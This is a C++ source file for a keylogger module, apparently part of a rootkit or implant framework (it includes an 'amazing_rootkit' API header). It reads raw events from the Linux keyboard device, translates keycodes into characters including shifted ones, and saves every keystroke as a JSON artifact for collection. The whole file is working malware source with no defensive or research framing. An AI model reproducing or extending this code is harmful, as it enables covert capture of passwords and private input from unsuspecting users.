#include <boost/filesystem.hpp>
#include <boost/system/system_error.hpp>
#include "../include/json.hpp"
#include <iostream>
#include <regex>
#include <vector>
#include <string>
#include <fstream>
#include <random>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <linux/input.h>
#include <fcntl.h>
#include <signal.h>

#include "KeyLogger.h"
#include "../Utils/CryptoUtils.h"
#include "../Utils/MachineUtils.h"
#include "../amazing_rootkit/api/api.h"

static const char *keycodes[] =
    {
        "RESERVED", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0",
        "-", "=", "BACKSPACE", "TAB", "q", "w", "e", "r", "t", "y", "u", "i",
        "o", "p", "[", "]", "ENTER", "L_CTRL", "a", "s", "d", "f", "g", "h",
        "j", "k", "l", ";", "'", "`", "L_SHIFT", "\\", "z", "x", "c", "v", "b",
        "n", "m", ",", ".", "/", "R_SHIFT", "*", "L_ALT", "SPACE", "CAPS_LOCK", 
        "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "NUM_LOCK",
        "SCROLL_LOCK", "NL_7", "NL_8", "NL_9", "-", "NL_4", "NL5",
        "NL_6", "+", "NL_1", "NL_2", "NL_3", "INS", "DEL", UK, UK, UK,
        "F11", "F12", UK, UK,	UK, UK,	UK, UK, UK, "R_ENTER", "R_CTRL", "/", 
        "PRT_SCR", "R_ALT", UK, "HOME", "UP", "PAGE_UP", "LEFT", "RIGHT", "END", 
        "DOWN",	"PAGE_DOWN", "INSERT", "DELETE", UK, UK, UK, UK,UK, UK, UK, 
        "PAUSE"
    };

static const char *shifted_keycodes[] =
    {
        "RESERVED", "ESC", "!", "@", "#", "$", "%", "^", "&", "*", "(", ")", 
        "_", "+", "BACKSPACE", "TAB", "Q", "W", "E", "R", "T", "Y", "U", "I", 
        "O", "P", "{", "}", "ENTER", "L_CTRL", "A", "S", "D", "F", "G", "H", 
        "J", "K", "L", ":", "\"", "~", "L_SHIFT", "|", "Z", "X", "C", "V", "B", 
        "N", "M", "<", ">", "?", "R_SHIFT", "*", "L_ALT", "SPACE", "CAPS_LOCK", 
        "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "NUM_LOCK", 
        "SCROLL_LOCK", "HOME", "UP", "PGUP", "-", "LEFT", "NL_5", 
        "R_ARROW", "+", "END", "DOWN", "PGDN", "INS", "DEL", UK, UK, UK, 
        "F11", "F12", UK, UK,	UK, UK,	UK, UK, UK, "R_ENTER", "R_CTRL", "/", 
        "PRT_SCR", "R_ALT", UK, "HOME", "UP", "PAGE_UP", "LEFT", "RIGHT", "END", 
        "DOWN",	"PAGE_DOWN", "INSERT", "DELETE", UK, UK, UK, UK,UK, UK, UK, 
        "PAUSE"
    };

void KeyLogger::module_impl()
{
    std::cout << "Running" << module_type << " with args: " << args.dump() << std::endl;

    struct input_event event;
    std::string char_to_send;
    nlohmann::json ret_json;

    mtx.lock();

    if (!keyboard_fd) {
        if ((keyboard_fd = open(KEYBOARD, O_RDONLY)) < 0) {
            run_ = false;
            return;
        }
    }

    read(keyboard_fd, &event, sizeof(event));

    mtx.unlock();

    /* If a key from the keyboard is pressed */
    if (event.type == EV_KEY && event.value == 1) {
        if (ESCAPE(event.code)) {
            return;
        }

        if (SHIFT(event.code)) {
            shift_flag = event.code;
        }

        if (shift_flag && !SHIFT(event.code)) {
            char_to_send += shifted_keycodes[event.code];
        } else if (!shift_flag && !SHIFT(event.code)) {
            char_to_send += keycodes[event.code];
        }
    } else {
        /* If a key from the keyboard is released */
        if (event.type == EV_KEY && event.value == 0)
            if (SHIFT(event.code))
                shift_flag = 0;
    }

    if (!char_to_send.length()) {
        return;
    }

    ret_json[module_type] = char_to_send;
    save_artifact(ret_json);

    return;
}

void KeyLogger::stop()
{
    run_ = false;

    mtx.lock();

    if (keyboard_fd) {
        close(keyboard_fd);
        keyboard_fd = 0;
    }

    mtx.unlock();
}
